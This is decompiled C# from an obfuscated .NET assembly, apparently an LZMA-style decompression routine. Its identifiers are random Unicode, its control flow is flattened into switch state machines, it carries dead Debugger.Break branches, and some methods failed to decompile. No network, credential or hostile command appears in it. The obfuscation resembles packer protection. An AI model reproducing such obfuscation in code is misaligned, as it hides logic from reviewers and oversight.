      *(int*) ((IntPtr) voidPtr + 4) = this.\uE783ੱ\uE861\uEE3D牦ⴸᗄ澴;
      *(int*) ((IntPtr) voidPtr + 8) = 2;
label_6:
      while (true)
      {
        switch (*(int*) ((IntPtr) voidPtr + 8))
        {
          case 0:
            goto label_5;
          case 3:
            goto label_4;
          default:
            while (*(int*) ((IntPtr) voidPtr + 4) <= 0)
            {
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879.뺻岶\uF0C1\uFFFD\u1CB9ᣖ셌\uE62A);
              }
              else
              {
                *(int*) ((IntPtr) voidPtr + 8) = 3;
                goto label_6;
              }
            }
            *(int*) voidPtr = ((int) *(uint*) voidPtr << 1) + (int) this.룳\u2950᱀攽蝻\uE183倰䍌[(IntPtr) *(uint*) voidPtr].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(_param1);
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - 1;
            *(int*) ((IntPtr) voidPtr + 8) = 1;
            continue;
        }
      }
label_4:
      return *(uint*) voidPtr - (uint) (1 << this.\uE783ੱ\uE861\uEE3D牦ⴸᗄ澴);
    }

    public uint 뺻岶\uF0C1\uFFFD\u1CB9ᣖ셌\uE62A(
      \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏 _param1)
    {
      // ISSUE: unable to decompile the method.
    }

    public static unsafe uint 뺻岶\uF0C1\uFFFD\u1CB9ᣖ셌\uE62A(
      \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[] _param0,
      uint _param1,
      \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏 _param2,
      int _param3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
label_10:
      *(int*) voidPtr = 1;
      *(int*) ((IntPtr) voidPtr + 16) = 3;
      int num1;
      while (true)
      {
        do
        {
          switch (*(int*) ((IntPtr) voidPtr + 16))
          {
            case 0:
              goto label_10;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              num1 = *(int*) ((IntPtr) voidPtr + 8);
              if (true)
              {
                int num2 = _param3;
                if (num1 < num2)
                  goto case 5;
                else
                  goto label_1;
              }
              else
                goto label_7;
            case 5:
              *(int*) ((IntPtr) voidPtr + 12) = (int) _param0[(IntPtr) (_param1 + *(uint*) voidPtr)].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(_param2);
              continue;
            case 6:
              goto label_9;
            default:
              *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
              goto case 4;
          }
        }
        while (false);
        goto label_6;
label_2:
        *(int*) ((IntPtr) voidPtr + 4) = (int) *(uint*) ((IntPtr) voidPtr + 4) | (int) *(uint*) ((IntPtr) voidPtr + 12) << *(int*) ((IntPtr) voidPtr + 8);
        *(int*) ((IntPtr) voidPtr + 16) = 1;
        continue;
label_3:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 4) = 0;
          *(int*) ((IntPtr) voidPtr + 8) = 0;
          *(int*) ((IntPtr) voidPtr + 16) = 4;
          continue;
        }
        Debugger.Break();
        goto label_9;
label_6:
        *(int*) ((IntPtr) voidPtr + 16) = 6;
        continue;
label_9:
        *(int*) voidPtr = (int) *(uint*) voidPtr << 1;
        *(int*) voidPtr = (int) *(uint*) voidPtr + (int) *(uint*) ((IntPtr) voidPtr + 12);
        *(int*) ((IntPtr) voidPtr + 16) = 2;
      }
label_7:
      return (uint) num1;
label_1:
      return *(uint*) ((IntPtr) voidPtr + 4);
    }
  }

  public class 歔\u2B06蔫更\uFFFD㓣\uE6B0됟
  {
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.玾\u0CD9\uE1B4榉羏\uE22A\u330F쮯 䁬㲙㓯蟒럅䉘梘\uE421 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.玾\u0CD9\uE1B4榉羏\uE22A\u330F쮯();
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏 \u1377徣綞蛾橯껪鞳㠟 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏();
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[] 뗧㬤\uE9D8冪䁎踤띿\uFFFD = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[new IntPtr(192)];
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[] 뼨ꔯ鞃ꐆ\u088D줩瘥\uE56A = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[new IntPtr(12)];
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[] ஒ몮ો\u2605啣\u2E55ꛡ\u2404 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[new IntPtr(12)];
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[] 䮒곣吮洴㢕ಮ䳚\uE279 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[new IntPtr(12)];
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[] 鴣྆勀轌讔\uEF1B䛻豋 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[new IntPtr(12)];
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[] ꐓ\uF4F4㚫ᰵ넙巯\uECA3䒱 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[new IntPtr(192)];
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879[] 䓙\u16FB媨膒ᅻ추낆폠 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879[new IntPtr(4)];
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[] 㙟꯳䥍픛렷ᘒ墉ⷧ = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[new IntPtr(114)];
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879 ဆ輆\uFFFD呣\uE60B\uE6B2漢ꐂ = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879(4);
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟.ꈒ\u2A9D璸\u3334\uEE62\u0F02袪㵙 \uF69D胱숩렋\u2CF6\u22C7駣칺 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟.ꈒ\u2A9D璸\u3334\uEE62\u0F02袪㵙();
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟.ꈒ\u2A9D璸\u3334\uEE62\u0F02袪㵙 䭓뷕\u2617精뫂ᠵꕜ딿 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟.ꈒ\u2A9D璸\u3334\uEE62\u0F02袪㵙();
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟.潣丽閭틋ﱓ믥탊ॼ 욇䟌籫莽벇銐覠퀓 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟.潣丽閭틋ﱓ믥탊ॼ();
    private uint 䜥\u192C驙\uFFFD\uE86D籔㲻\u2466;
    private uint \uFFFD㓆挒䅙ꖲ琔ᯊ顇;
    private uint 돢녺\u28AE쵢ᚩ\uEFDD\uF097泔;
    private bool 策畔㚋耬\uE5CAៅ㮠폻;

    public 歔\u2B06蔫更\uFFFD㓣\uE6B0됟()
    {
      this.䜥\u192C驙\uFFFD\uE86D籔㲻\u2466 = uint.MaxValue;
      for (int index = 0; index < 4; ++index)
        this.䓙\u16FB媨膒ᅻ추낆폠[index] = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879(6);
    }

    private unsafe void 㢱챠蠟\u226F\uA4A3礜\uEFAC晰(uint _param1)
    {
      do
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(8);
label_10:
        if ((int) this.䜥\u192C驙\uFFFD\uE86D籔㲻\u2466 == (int) _param1)
          break;
label_11:
        this.䜥\u192C驙\uFFFD\uE86D籔㲻\u2466 = _param1;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 4) = 1;
          if (true)
            goto label_13;
label_5:
          Debugger.Break();
label_6:
          *(int*) voidPtr = (int) \u001E.\u0081(this.\uFFFD㓆挒䅙ꖲ琔ᯊ顇, 4096U);
          if (false)
          {
            if (true)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟.\u002Ector);
              if (true)
                goto label_5;
              else
                goto label_5;
            }
            else
              continue;
          }
          else
          {
            this.䁬㲙㓯蟒럅䉘梘\uE421.\uE2AF莾īˀ뚷\uF7CD肩拄(*(uint*) voidPtr);
            break;
          }
label_13:
          while (true)
          {
            switch (*(int*) ((IntPtr) voidPtr + 4))
            {
              case 0:
                goto label_10;
              case 2:
                goto label_6;
              default:
                this.\uFFFD㓆挒䅙ꖲ琔ᯊ顇 = \u001E.\u0081(this.䜥\u192C驙\uFFFD\uE86D籔㲻\u2466, 1U);
                if (true)
                {
                  *(int*) ((IntPtr) voidPtr + 4) = 2;
                  continue;
                }
                goto label_11;
            }
          }
        }
      }
      while (false);
    }

    private void 䲹㲀\uEC50釼㧖\uE341ꗊ詸(int _param1, int _param2)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        this.욇䟌籫莽벇銐覠퀓.\uE2AF莾īˀ뚷\uF7CD肩拄(_param1, _param2);
        goto label_2;
      }
      while (false);
    }

    private unsafe void ꅕ렑뽛貖㑔鋶㮟ᚥ(int _param1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
label_7:
      *(int*) voidPtr = 1 << _param1;
      if (true)
        goto label_8;
label_3:
      *(int*) ((IntPtr) voidPtr + 4) = 1;
      goto label_9;
label_8:
      *(int*) ((IntPtr) voidPtr + 4) = 4;
label_9:
      while (true)
      {
        do
        {
          switch (*(int*) ((IntPtr) voidPtr + 4))
          {
            case 0:
              goto label_7;
            case 1:
              goto label_6;
            case 2:
              goto label_10;
            case 3:
              goto label_2;
            case 4:
              continue;
            default:
              goto label_1;
          }
        }
        while (false);
        this.\uF69D胱숩렋\u2CF6\u22C7駣칺.\uE2AF莾īˀ뚷\uF7CD肩拄(*(uint*) voidPtr);
        *(int*) ((IntPtr) voidPtr + 4) = 2;
        continue;
label_10:
        this.䭓뷕\u2617精뫂ᠵꕜ딿.\uE2AF莾īˀ뚷\uF7CD肩拄(*(uint*) voidPtr);
        *(int*) ((IntPtr) voidPtr + 4) = 3;
      }
label_6:
      return;
label_1:
      return;
label_2:
      this.돢녺\u28AE쵢ᚩ\uEFDD\uF097泔 = *(uint*) voidPtr - 1U;
      goto label_3;
    }

    private unsafe void \u2688\u09F2暜\u0C76聲\uF57B荑髪(Stream _param1, Stream _param2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
label_24:
      this.\u1377徣綞蛾橯껪鞳㠟.\u2688\u09F2暜\u0C76聲\uF57B荑髪(_param1);
      this.䁬㲙㓯蟒럅䉘梘\uE421.\u2688\u09F2暜\u0C76聲\uF57B荑髪(_param2, this.策畔㚋耬\uE5CAៅ㮠폻);
      *(int*) ((IntPtr) voidPtr + 12) = 5;
      while (true)
      {
        switch (*(int*) ((IntPtr) voidPtr + 12))
        {
          case 0:
            goto label_24;
          case 1:
            goto label_18;
          case 2:
            this.ဆ輆\uFFFD呣\uE60B\uE6B2漢ꐂ.\u2688\u09F2暜\u0C76聲\uF57B荑髪();
            *(int*) ((IntPtr) voidPtr + 12) = 1;
            continue;
          case 3:
            *(int*) ((IntPtr) voidPtr + 4) = (int) *(uint*) ((IntPtr) voidPtr + 4) + 1;
            break;
          case 4:
            *(int*) voidPtr = (int) *(uint*) voidPtr + 1;
            goto case 9;
          case 5:
            *(int*) voidPtr = 0;
            goto case 8;
          case 6:
            this.䭓뷕\u2617精뫂ᠵꕜ딿.\u2688\u09F2暜\u0C76聲\uF57B荑髪();
            *(int*) ((IntPtr) voidPtr + 12) = 2;
            continue;
          case 7:
            this.ஒ몮ો\u2605啣\u2E55ꛡ\u2404[(IntPtr) *(uint*) voidPtr].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
            this.䮒곣吮洴㢕ಮ䳚\uE279[(IntPtr) *(uint*) voidPtr].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
            this.鴣྆勀轌讔\uEF1B䛻豋[(IntPtr) *(uint*) voidPtr].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
            *(int*) voidPtr = (int) *(uint*) voidPtr + 1;
            *(int*) ((IntPtr) voidPtr + 12) = 8;
            continue;
          case 8:
            if (*(uint*) voidPtr < 12U)
            {
              *(int*) ((IntPtr) voidPtr + 4) = 0;
              break;
            }
            this.욇䟌籫莽벇銐覠퀓.\u2688\u09F2暜\u0C76聲\uF57B荑髪();
            *(int*) voidPtr = 0;
            *(int*) ((IntPtr) voidPtr + 12) = 9;
            continue;
          case 9:
            if (*(uint*) voidPtr >= 4U)
            {
              *(int*) ((IntPtr) voidPtr + 12) = 12;
              continue;
            }
            this.䓙\u16FB媨膒ᅻ추낆폠[(IntPtr) *(uint*) voidPtr].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
            *(int*) ((IntPtr) voidPtr + 12) = 4;
            continue;
          case 10:
            if (*(uint*) voidPtr < 114U)
            {
              this.㙟꯳䥍픛렷ᘒ墉ⷧ[(IntPtr) *(uint*) voidPtr].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
              *(int*) ((IntPtr) voidPtr + 12) = 11;
              continue;
            }
            this.\uF69D胱숩렋\u2CF6\u22C7駣칺.\u2688\u09F2暜\u0C76聲\uF57B荑髪();
            *(int*) ((IntPtr) voidPtr + 12) = 6;
            continue;
          case 11:
            *(int*) voidPtr = (int) *(uint*) voidPtr + 1;
            goto case 10;
          case 12:
            *(int*) voidPtr = 0;
            *(int*) ((IntPtr) voidPtr + 12) = 10;
            continue;
          default:
            goto label_16;
        }
        if (*(uint*) ((IntPtr) voidPtr + 4) > this.돢녺\u28AE쵢ᚩ\uEFDD\uF097泔)
        {
          this.뼨ꔯ鞃ꐆ\u088D줩瘥\uE56A[(IntPtr) *(uint*) voidPtr].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
          *(int*) ((IntPtr) voidPtr + 12) = 7;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 8) = ((int) *(uint*) voidPtr << 4) + (int) *(uint*) ((IntPtr) voidPtr + 4);
          this.뗧㬤\uE9D8冪䁎踤띿\uFFFD[(IntPtr) *(uint*) ((IntPtr) voidPtr + 8)].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
          this.ꐓ\uF4F4㚫ᰵ넙巯\uECA3䒱[(IntPtr) *(uint*) ((IntPtr) voidPtr + 8)].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
          *(int*) ((IntPtr) voidPtr + 12) = 3;
        }
      }
label_18:
      return;
label_16:;
    }

    public unsafe void Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5(
      Stream _param1,
      Stream _param2,
      long _param3,
      long 穰콙患沎饺예믐ꎭ)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(59);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num1;
label_73:
      this.\u2688\u09F2暜\u0C76聲\uF57B荑髪(_param1, _param2);
      *(int*) ((IntPtr) voidPtr + 52) = 39;
      while (true)
      {
        \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.鲘잉䡦ξꕒ틃ᒛ\u2569 鲘잉䡦ξꕒ틃ᒛ;
        int num2;
        do
        {
          int num3;
          do
          {
            int num4;
            do
            {
              int num5;
              do
              {
                int num6;
                do
                {
                  switch (*(int*) ((IntPtr) voidPtr + 52))
                  {
                    case 0:
                      goto label_73;
                    case 1:
                      goto label_69;
                    case 2:
                      goto label_75;
                    case 3:
                      goto label_1;
                    case 4:
                      goto label_2;
                    case 5:
                      goto label_3;
                    case 6:
                    case 49:
                      goto label_67;
                    case 7:
                    case 29:
                      goto label_41;
                    case 8:
                      goto label_8;
                    case 9:
                      num6 = (int) this.뗧㬤\uE9D8冪䁎踤띿\uFFFD[(IntPtr) ((鲘잉䡦ξꕒ틃ᒛ.졩댬\u208C轰\u17FEᖺﺚ䜘 << 4) + *(uint*) ((IntPtr) voidPtr + 32))].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(this.\u1377徣綞蛾橯껪鞳㠟);
                      *(int*) ((IntPtr) voidPtr + 52) = 42;
                      continue;
                    case 10:
                      goto label_13;
                    case 11:
                      goto label_14;
                    case 12:
                      goto label_15;
                    case 13:
                      goto label_16;
                    case 14:
                      goto label_17;
                    case 15:
                      goto label_19;
                    case 16:
                      goto label_20;
                    case 17:
                      goto label_21;
                    case 18:
                      goto label_23;
                    case 19:
                      goto label_25;
                    case 20:
                      goto label_27;
                    case 21:
                      goto label_29;
                    case 22:
                      goto label_30;
                    case 23:
                      goto label_32;
                    case 24:
                      goto label_33;
                    case 25:
                      goto label_34;
                    case 26:
                      goto label_35;
                    case 27:
                      goto label_37;
                    case 28:
                      goto label_38;
                    case 30:
                      goto label_42;
                    case 31:
                      goto label_43;
                    case 32:
                      goto label_44;
                    case 33:
                      goto label_45;
                    case 34:
                      goto label_46;
                    case 35:
                      goto label_47;
                    case 36:
                      goto label_48;
                    case 37:
                      goto label_49;
                    case 38:
                      goto label_51;
                    case 39:
                      goto label_52;
                    case 40:
                      goto label_53;
                    case 41:
                      goto label_54;
                    case 42:
                      goto label_55;
                    case 43:
                      goto label_57;
                    case 44:
                      goto label_59;
                    case 45:
                      goto label_60;
                    case 46:
                      goto label_62;
                    case 47:
                      goto label_63;
                    case 48:
                      goto label_66;
                    case 50:
                      goto label_70;
                    case 51:
                      goto label_71;
                    default:
                      goto label_5;
                  }
                }
                while (num6 != 0);
                goto label_10;
label_21:
                if (this.䮒곣吮洴㢕ಮ䳚\uE279[(IntPtr) 鲘잉䡦ξꕒ틃ᒛ.졩댬\u208C轰\u17FEᖺﺚ䜘].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(this.\u1377徣綞蛾橯껪鞳㠟) != 0U)
                {
                  num5 = (int) this.鴣྆勀轌讔\uEF1B䛻豋[(IntPtr) 鲘잉䡦ξꕒ틃ᒛ.졩댬\u208C轰\u17FEᖺﺚ䜘].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(this.\u1377徣綞蛾橯껪鞳㠟);
                  *(int*) ((IntPtr) voidPtr + 52) = 26;
                }
                else
                  goto label_22;
              }
              while (num5 != 0);
              goto label_7;
label_27:
              num4 = (int) *(uint*) ((IntPtr) voidPtr + 44);
              *(int*) ((IntPtr) voidPtr + 52) = 27;
            }
            while ((uint) num4 < 4U);
            goto label_28;
label_30:
            num3 = (int) this.ஒ몮ો\u2605啣\u2E55ꛡ\u2404[(IntPtr) 鲘잉䡦ξꕒ틃ᒛ.졩댬\u208C轰\u17FEᖺﺚ䜘].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(this.\u1377徣綞蛾橯껪鞳㠟);
            *(int*) ((IntPtr) voidPtr + 52) = 17;
          }
          while (num3 != 0);
          goto label_31;
label_55:
          num2 = (int) this.뼨ꔯ鞃ꐆ\u088D줩瘥\uE56A[(IntPtr) 鲘잉䡦ξꕒ틃ᒛ.졩댬\u208C轰\u17FEᖺﺚ䜘].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(this.\u1377徣綞蛾橯껪鞳㠟);
          *(int*) ((IntPtr) voidPtr + 52) = 15;
        }
        while (num2 != 1);
        goto label_56;
label_1:
        this.䁬㲙㓯蟒럅䉘梘\uE421.\uF2E7恡أﲢ\u0DCD\uEB85ੴ퉬(*(byte*) ((IntPtr) voidPtr + 57));
        *(int*) ((IntPtr) voidPtr + 52) = 13;
        continue;
label_2:
        *(int*) ((IntPtr) voidPtr + 52) = 47;
        continue;
label_3:
        if (*(uint*) ((IntPtr) voidPtr + 44) < 14U)
        {
          *(int*) ((IntPtr) voidPtr + 16) = (int) *(uint*) ((IntPtr) voidPtr + 16) + (int) \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879.뺻岶\uF0C1\uFFFD\u1CB9ᣖ셌\uE62A(this.㙟꯳䥍픛렷ᘒ墉ⷧ, (uint) ((int) *(uint*) ((IntPtr) voidPtr + 16) - (int) *(uint*) ((IntPtr) voidPtr + 44) - 1), this.\u1377徣綞蛾橯껪鞳㠟, *(int*) ((IntPtr) voidPtr + 48));
          *(int*) ((IntPtr) voidPtr + 52) = 10;
          continue;
        }
        goto label_42;
label_7:
        *(int*) ((IntPtr) voidPtr + 52) = 11;
        continue;
label_8:
        *(int*) ((IntPtr) voidPtr + 28) = 0;
        *(int*) ((IntPtr) voidPtr + 52) = 43;
        continue;
label_10:
        *(int*) ((IntPtr) voidPtr + 52) = 23;
        continue;
label_13:
        *(int*) ((IntPtr) voidPtr + 52) = 47;
        continue;
label_14:
        *(int*) ((IntPtr) voidPtr + 40) = (int) *(uint*) ((IntPtr) voidPtr + 24);
        goto label_36;
label_15:
        *(int*) ((IntPtr) voidPtr + 24) = 0;
        *(int*) ((IntPtr) voidPtr + 52) = 8;
        continue;
label_16:
        鲘잉䡦ξꕒ틃ᒛ.\uF5EE\uFFFD\uA7F6羜\uF48C拣頄鑪();
        *(int*) ((IntPtr) voidPtr + 52) = 35;
        continue;
label_17:
        if (false)
        {
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟.䲹㲀\uEC50釼㧖\uE341ꗊ詸);
          if (true)
            ;
          Debugger.Break();
          goto label_13;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 52) = 47;
          continue;
        }
label_19:
        *(int*) ((IntPtr) voidPtr + 28) = (int) *(uint*) ((IntPtr) voidPtr + 24);
        *(int*) ((IntPtr) voidPtr + 52) = 16;
        continue;
label_20:
        *(int*) ((IntPtr) voidPtr + 24) = (int) *(uint*) ((IntPtr) voidPtr + 20);
        *(int*) ((IntPtr) voidPtr + 20) = (int) *(uint*) ((IntPtr) voidPtr + 16);
        *(int*) ((IntPtr) voidPtr + 52) = 25;
        continue;
label_22:
        *(int*) ((IntPtr) voidPtr + 52) = 46;
        continue;
label_23:
        if (!鲘잉䡦ξꕒ틃ᒛ.咨\uF2CB诣㤆啸\uE099䔧ᬷ())
        {
          *(sbyte*) ((IntPtr) voidPtr + 57) = (sbyte) this.욇䟌籫莽벇銐覠퀓.ꧯ\u298B햏挒쉟\uFFFD撊娦(this.\u1377徣綞蛾橯껪鞳㠟, (uint) *(long*) voidPtr, *(byte*) ((IntPtr) voidPtr + 58), this.䁬㲙㓯蟒럅䉘梘\uE421.櫈Ӷꓵ䔓\u24D2Ⲳ誌姼(*(uint*) ((IntPtr) voidPtr + 16)));
          *(int*) ((IntPtr) voidPtr + 52) = 3;
          continue;
        }
        goto label_29;
label_25:
        *(int*) ((IntPtr) voidPtr + 16) = (int) *(uint*) ((IntPtr) voidPtr + 40);
label_26:
        *(int*) ((IntPtr) voidPtr + 36) = (int) this.䭓뷕\u2617精뫂ᠵꕜ딿.䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(this.\u1377徣綞蛾橯껪鞳㠟, *(uint*) ((IntPtr) voidPtr + 32)) + 2;
        *(int*) ((IntPtr) voidPtr + 52) = 41;
        continue;
label_28:
        *(int*) ((IntPtr) voidPtr + 52) = 32;
        continue;
label_29:
        *(sbyte*) ((IntPtr) voidPtr + 57) = (sbyte) this.욇䟌籫莽벇銐覠퀓.봍ꛑ쾬Ꮡ\uFFFD魅य़㥯(this.\u1377徣綞蛾橯껪鞳㠟, (uint) *(long*) voidPtr, *(byte*) ((IntPtr) voidPtr + 58));
        *(int*) ((IntPtr) voidPtr + 52) = 3;
        continue;
label_31:
        *(int*) ((IntPtr) voidPtr + 52) = 37;
        continue;
label_32:
        *(sbyte*) ((IntPtr) voidPtr + 58) = (sbyte) this.䁬㲙㓯蟒럅䉘梘\uE421.櫈Ӷꓵ䔓\u24D2Ⲳ誌姼(0U);
        *(int*) ((IntPtr) voidPtr + 52) = 18;
        continue;
label_33:
        *(int*) ((IntPtr) voidPtr + 44) = (int) this.䓙\u16FB媨膒ᅻ추낆폠[(IntPtr) \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.厕츨磀텼ℚ㽣닟\u2BD0(*(uint*) ((IntPtr) voidPtr + 36))].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(this.\u1377徣綞蛾橯껪鞳㠟);
        *(int*) ((IntPtr) voidPtr + 52) = 20;
        continue;
label_34:
        *(int*) ((IntPtr) voidPtr + 36) = 2 + (int) this.\uF69D胱숩렋\u2CF6\u22C7駣칺.䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(this.\u1377徣綞蛾橯껪鞳㠟, *(uint*) ((IntPtr) voidPtr + 32));
        鲘잉䡦ξꕒ틃ᒛ.졈勫馃넞￻걞\u22ED\u2F31();
        *(int*) ((IntPtr) voidPtr + 52) = 24;
        continue;
label_35:
        *(int*) ((IntPtr) voidPtr + 40) = (int) *(uint*) ((IntPtr) voidPtr + 28);
        *(int*) ((IntPtr) voidPtr + 28) = (int) *(uint*) ((IntPtr) voidPtr + 24);
label_36:
        *(int*) ((IntPtr) voidPtr + 24) = (int) *(uint*) ((IntPtr) voidPtr + 20);
        *(int*) ((IntPtr) voidPtr + 52) = 29;
        continue;
label_37:
        *(int*) ((IntPtr) voidPtr + 16) = (int) *(uint*) ((IntPtr) voidPtr + 44);
        *(int*) ((IntPtr) voidPtr + 52) = 47;
        continue;
label_38:
        if (this.뗧㬤\uE9D8冪䁎踤띿\uFFFD[(IntPtr) (鲘잉䡦ξꕒ틃ᒛ.졩댬\u208C轰\u17FEᖺﺚ䜘 << 4)].䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(this.\u1377徣綞蛾橯껪鞳㠟) == 0U)
        {
          鲘잉䡦ξꕒ틃ᒛ.\uF5EE\uFFFD\uA7F6羜\uF48C拣頄鑪();
          *(sbyte*) ((IntPtr) voidPtr + 56) = (sbyte) this.욇䟌籫莽벇銐覠퀓.봍ꛑ쾬Ꮡ\uFFFD魅य़㥯(this.\u1377徣綞蛾橯껪鞳㠟, 0U, (byte) 0);
          *(int*) ((IntPtr) voidPtr + 52) = 31;
          continue;
        }
        goto label_39;
label_41:
        *(int*) ((IntPtr) voidPtr + 20) = (int) *(uint*) ((IntPtr) voidPtr + 16);
        *(int*) ((IntPtr) voidPtr + 52) = 19;
        continue;
label_42:
        *(int*) ((IntPtr) voidPtr + 16) = (int) *(uint*) ((IntPtr) voidPtr + 16) + ((int) this.\u1377徣綞蛾橯껪鞳㠟.篘쿭껪뉹垾袑퇧ᆾ(*(int*) ((IntPtr) voidPtr + 48) - 4) << 4);
        *(int*) ((IntPtr) voidPtr + 52) = 34;
        continue;
label_43:
        this.䁬㲙㓯蟒럅䉘梘\uE421.\uF2E7恡أﲢ\u0DCD\uEB85ੴ퉬(*(byte*) ((IntPtr) voidPtr + 56));
        *(int*) ((IntPtr) voidPtr + 52) = 45;
        continue;
label_44:
        *(int*) ((IntPtr) voidPtr + 48) = (int) (*(uint*) ((IntPtr) voidPtr + 44) >> 1) - 1;
        *(int*) ((IntPtr) voidPtr + 52) = 51;
        continue;
label_45:
